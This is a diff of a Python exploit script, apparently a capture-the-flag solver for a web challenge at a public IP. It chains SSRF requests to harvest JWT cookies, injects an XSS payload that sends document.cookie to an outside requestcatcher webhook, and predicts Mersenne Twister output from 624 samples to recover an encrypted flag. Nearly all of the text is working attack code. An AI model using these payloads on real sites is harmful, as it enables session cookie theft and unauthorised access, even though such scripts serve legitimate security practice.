@@ -1,9 +1,9 @@
 import httpx
 from mt19937predictor import MT19937Predictor
 
-URL = "http://localhost:1811"
+URL = "http://77.37.47.226:1811"
 
-WEBHOOK = "https://demoaja.requestcatcher.com/get_flag_enc?c="
+WEBHOOK = "https://demoaja.requestcatcher.com/testcok?c="
 
 ENC_FLAG = "400d63a4cc4ba2fac3716bd29ebfc563"
 demo = "http://youtube.com&@google.com#@wikipedia.com/"
@@ -17,24 +17,24 @@ class BaseAPI:
         r = self.c.post('/hosts', data={
             'host': host
         })
+        # print(r.text)
         self.simulate_adm2 = r.cookies.get('jwt2')
         print('ssrf /hosts bypassed, this the jwt : ', self.simulate_adm2)
     def ssrf_and_get_jwt_by_requests(self):
         r = self.c.post('/requests', data={
             'url': demo
         })
+        # print(r.text)
         self.simulate_adm1 = r.cookies.get('jwt')
         print('ssrf /requests bypassed, this the jwt : ', self.simulate_adm1)
     def submit(self):
         r = self.c.post('/check', data={
             'pop_rdi': 'about:blank', 
-            'timeout':'60000',
-        #   onmousedown="mouse_down()" <- because of this we can trigger xss when using mouseup but in playwright is no user interaction.
-            'category':'mouseup', 
+            'timeout':'15000',
+            'category':'mousedown', 
             'my-headache':'Severe headache triggered by JS!',
             # why we trigger alert? to load the window location so it will not close
-            'your-headache':f"\");window.location.href = \"{WEBHOOK}\"+document.cookie;new up_coming_features;//",
-            # 'your-headache': f"\");location='javascript:alert\\x28\\'a\\'\\x29';//" # <-- you can use this to bypass ( 
+            'your-headache':f"window.location.href = \"{WEBHOOK}\"+document.cookie;alert(document.cookie)",
             
             # for debug
             # 'your-headache':"fetch('http://localhost:1811/flag?flag=33671c99be5c1b5988f6d358f24093c4').then(r => r.text()).then(alert).catch(console.error);",
@@ -47,8 +47,7 @@ class BaseAPI:
     def get_flag(self):
         predictor = MT19937Predictor()
 
-        for i in range(624):
-            print('iteration : ', i)
+        for _ in range(624):
             x = self.c.get('/debug?debug=1')
             predictor.setrandbits(int(x.json()['hash']), 32) 
         r = self.c.get('/debug', params={
